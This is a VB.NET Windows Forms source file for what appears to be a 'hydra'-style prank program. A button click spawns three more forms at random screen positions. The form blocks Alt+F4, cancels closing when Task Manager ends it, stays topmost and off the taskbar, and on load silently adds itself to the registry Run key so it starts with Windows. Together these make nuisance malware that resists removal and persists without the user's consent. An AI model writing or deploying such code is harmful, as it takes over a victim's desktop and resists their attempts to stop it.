Imports Microsoft.Win32
Public Class Form2

    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const VK_F4 As Integer = &H73
    Private Const MOD_ALT As Integer = &H1

    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, keyData As Keys) As Boolean
        If (msg.Msg = WM_SYSKEYDOWN AndAlso (keyData = (Keys.F4 Or Keys.Alt))) Then
            ' Prevent Alt+F4 from closing the form
            Return True
        End If
        Return MyBase.ProcessCmdKey(msg, keyData)
    End Function

    Private Sub AddToStartup()
        Try
            ' Get the current user's registry key
            Dim rkCurrentUser As RegistryKey = Registry.CurrentUser

            ' Open the registry key for startup applications
            Dim rkApp = rkCurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

            ' Add your application to the startup
            rkApp.SetValue("YourAppName", Application.ExecutablePath)

            ' Close the registry key
            rkApp.Close()

            ' Hide the application's main window (optional)
            Me.Visible = False

        Catch ex As Exception
            MessageBox.Show($"Error adding to startup: {ex.Message}")
        End Try
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim h2 As Form2 = New Form2()
        Dim h3 As Form3 = New Form3()
        Dim h4 As Form4 = New Form4()

        h2.Show()
        h3.Show()
        h4.Show()
        Me.Hide()

        h2.Location = New Point(Rnd() * 900, Rnd() * 180)
        h3.Location = New Point(Rnd() * 860, Rnd() * 300)
        h4.Location = New Point(Rnd() * 700, Rnd() * 480)

    End Sub

    Private Sub hydra2_closing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If e.CloseReason = CloseReason.TaskManagerClosing Then
            ' Custom logic to handle Task Manager termination
            ' Optionally, show a message or prevent the form from closing
            e.Cancel = True
        End If
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.TopMost = True
        Me.ShowInTaskbar = False
        AddToStartup()

    End Sub
End Class